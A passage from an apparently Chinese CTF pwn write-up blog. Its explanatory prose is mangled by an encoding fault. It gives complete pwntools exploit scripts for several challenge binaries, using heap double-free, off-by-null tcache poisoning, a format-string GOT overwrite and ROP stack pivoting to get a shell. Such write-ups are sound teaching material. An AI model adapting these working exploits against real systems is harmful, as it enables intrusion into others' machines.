class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45206</span>, <span class="number">0x4525a</span>, <span class="number">0xef9f4</span>, <span class="number">0xf0897</span>]</span><br><span class="line">malloc_hook = lb + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = lb + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="comment">#free_hook = lb + libc.sym[&quot;__free_hook&quot;]</span></span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line">log.success(<span class="string">&quot;re ==&gt;&quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;s&#x27;</span>*<span class="number">0xb</span> + p64(lb + one_gadget[<span class="number">1</span>]) +p64(realloc))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-can-you-find-me"><a href="#2-can-you-find-me" class="headerlink" title="2. can_you_find_me"></a>2. can_you_find_me</h2><p>libc-2.27 ä¸‹åªæœ‰æ·»åŠ å’Œåˆ é™¤å †çš„æ“ä½œï¼Œå­˜åœ¨ off-by-nullï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071642328.png" alt="image-20230607164227278" style="zoom: 50%;" /><p>å¯ä»¥ä¿®æ”¹ prev-size ä½å’Œ  size ä½ä½¿ç”¨ unlink é€ æˆ tcache poisoningï¼Œç”±äºæ—  show åŠŸèƒ½ï¼Œéœ€è¦çˆ†ç ´ main_arena+96 ä¸º stdoutï¼Œæ‰“ stdout æ³„éœ² libcï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x60</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)     <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x70</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x5f0</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x5f0</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;f&#x27;</span>*<span class="number">0x20</span>)     <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;\x20\x06&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#-4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#-1</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x500</span>-<span class="number">8</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;\x60\xe7&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)          <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>, p64(system))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071708242.png" alt="image-20230607170831057" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071710504.png" alt="image-20230607171022315" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071724501.png" alt="image-20230607172442447" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071804704.png" alt="image-20230607180451501" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071812328.png" alt="image-20230607181237126" style="zoom:80%;" /><h2 id="3-candy-shop"><a href="#3-candy-shop" class="headerlink" title="3. candy_shop"></a>3. candy_shop</h2><p>æ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼Œå‘ç° got è¡¨å¯å†™ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306081609452.png" alt="image-20230608160942294" style="zoom: 67%;" /><p>ç¨‹åºä¸­å­˜åœ¨ä¸¤æ¬¡ printf æ ¼å¼åŒ–æ¼æ´å’Œ ä¸€æ¬¡ bss æ®µä¸Šçš„è¶Šç•Œå†™ï¼Œæ€è·¯å°±æ˜¯æ³„éœ²å‡º libcï¼Œç„¶åè¶Šç•Œå†™ printf çš„ got è¡¨ä¸º systemï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x1695)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me your name: \n&quot;</span>, <span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;you have received a gift:0x&quot;</span>)</span><br><span class="line">lb = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)-<span class="number">128</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Which one you want to bye: &quot;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x0156D)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-10&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">6</span> + p64(system))</span><br><span class="line">io.sendline(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-A-dream"><a href="#4-A-dream" class="headerlink" title="4. A_dream"></a>4. A_dream</h2><p>å«æœ‰å­è¿›ç¨‹çš„æ ˆæº¢å‡ºï¼ˆè¿ç§»ï¼‰ã€‚å€¼å¾—æ³¨æ„çš„ç‚¹æœ‰ï¼š</p><ol><li>å­è¿›ç¨‹çš„æ ˆä½¿ç”¨çš„æ˜¯<code>mmap</code>å‡ºçš„ä¸€ç‰‡ç©ºé—´ï¼Œä¸ libc åŸºå€æœ‰ç€å›ºå®šçš„åç§»ã€‚</li><li>ä¸»è¿›ç¨‹å¼€å¯äº†æ²™ç›’ï¼ˆåªå…è®¸ <code>read</code>å’Œ<code>write</code>ï¼Œæ— æ³•åˆ©ç”¨ï¼‰ï¼Œä½†ä¸å½±å“å­è¿›ç¨‹ï¼Œå› æ­¤åœ¨å­è¿›ç¨‹è¿›è¡Œ system(â€˜/bin/shâ€™) å³å¯ã€‚</li><li>gdb è°ƒè¯•å­è¿›ç¨‹æ–¹æ³•ï¼Œä½¿ç”¨<code>thread x</code>åˆ‡æ¢è¿›ç¨‹ï¼Œ<code>info threads</code>æŸ¥çœ‹è¿›ç¨‹ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./A_dream&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;A_dream&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404080</span> + <span class="number">0x100</span></span><br><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> + p64(bss + <span class="number">0x40</span>) + p64(magic_read)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401483</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401481</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = p64(pop_rsi_r15_ret) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&quot;read&quot;</span>]) + p64(pop_rdi_ret) + p64(<span class="number">0x1000</span>) + p64(elf.plt[<span class="string">&quot;sleep&quot;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(magic_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = lb + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi_rbp_ret = lb + <span class="number">0x00000000000248f2</span></span><br><span class="line">thread_stack_rop_addr = lb - <span class="number">0x4150</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(ret) + p64(pop_rdi_rbp_ret) + p64(binsh) + p64(<span class="number">0</span>) + p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(thread_stack_rop_addr-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-Approoooooooaching"><a href="#5-Approoooooooaching" class="headerlink" title="5. Approoooooooaching"></a>5. Approoooooooaching</h2><p>è™šæ‹Ÿæœºé¢˜ç›®ï¼ŒåŠŸèƒ½æœ‰ç”³è¯·å †å—ã€ç¼–è¾‘å †å—ã€ç¿»è¯‘å †å—ã€æ‰§è¡Œå †å—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        trans(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vm(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error chooice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> trans å…³é”®ä»£ç å¦‚ä¸‹ï¼Œå¯çŸ¥<code>!i$#xy*</code>åˆ†åˆ«ç¿»è¯‘ä¸º<code>1234567</code>å­˜å‚¨åœ¨ bss æ®µä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1269</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// [rsp+12h] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( !*(i + a1) || i &gt; <span class="number">0xFFF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">121</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="string">&#x27;x&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">64</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="string">&#x27;i&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">      --i;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">33</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">switch</span> ( *(i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_8480 == <span class="number">512</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        v2 = dword_8480++;</span><br><span class="line">        word_8080[v2] = i;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !dword_8480 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        v4 = word_8080[--dword_8480];</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">8</span>;</span><br><span class="line">        word_4082[<span class="number">2</span> * i] = v4;</span><br><span class="line">        word_4082[<span class="number">2</span> * v4] = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span 